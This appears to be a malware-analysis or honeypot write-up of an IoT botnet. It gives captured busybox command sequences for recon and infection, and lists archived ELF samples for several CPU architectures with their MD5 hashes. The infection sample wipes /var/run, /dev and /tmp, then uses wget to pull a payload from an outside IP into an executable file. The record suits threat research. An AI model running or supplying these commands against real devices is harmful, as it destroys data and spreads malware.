### Recon phase (sample)
```
enable
shell
sh
/bin/busybox ZORRO
/bin/busybox wget
cat /proc/mounts && /bin/busybox ZORRO
/bin/busybox cat /bin/sh
```

### Infection phase (sample)
```
enable
shell
sh
/bin/busybox rm -rf /var/run/* /dev/* /tmp/* /var/run/* >/dev/null 2>&1; /bin/busybox WOPBOT
/bin/busybox mkdir -p /var/run; /bin/busybox WOPBOT
/bin/busybox cp -f /bin/sh /var/run/oMNUckLhyt; /bin/busybox WOPBOT
/bin/busybox echo -ne '' > /var/run/oMNUckLhyt; /bin/busybox WOPBOT
/bin/busybox chmod 777 /var/run/oMNUckLhyt; /bin/busybox WOPBOT
/bin/busybox wget -O - http://85.118.98.197:61050/cyka/blyat/2.mp > /var/run/oMNUckLhyt && /bin/busybox WOPBOT
```

### Captured samples
* [1.mp](samples/1.mp.7z) (`ELF 32-bit, MIPS-I, MD5: eab8da47ff36cafd2662fd01b6959389`)
* [2.mp](samples/2.mp.7z) (`ELF 64-bit, MIPS-I, MD5: 4565f96cd8498a7e15ffa99e0d435d11`)
* [.arm](samples/arm.7z) (`ELF 32-bit, ARM, MD5: 8a7e32db13844f2d441340befd8dd8e9`)
* [.m68k](samples/m68k.7z) (`ELF 32-bit, Motorola 68020, MD5: 67c99761fac4c12e06fcf17fa1598360`)
* [.mp](samples/mp.7z) (`ELF 32-bit, MIPS-I, MD5: bdcee10dddb257baf6a84dd952f4c0dc`)
* [.mps](samples/mps.7z) (`ELF 32-bit, MIPS-I, MD5: 35e9948748c60f17f1f404e1debbb505`)
* [.ppc](samples/ppc.7z) (`ELF 32-bit, PowerPC, MD5: ad8c6e3fd1421a70a4df46117fa5da8b`)
* [.sh4](samples/sh4.7z) (`ELF 32-bit, Renesas SH, MD5: d82b630bc07d146f54f18861a0370243`)
* [.sparc](samples/sparc.7z) (`ELF 32-bit, SPARC, MD5: a14141949361398a8d9662b90168adeb`)

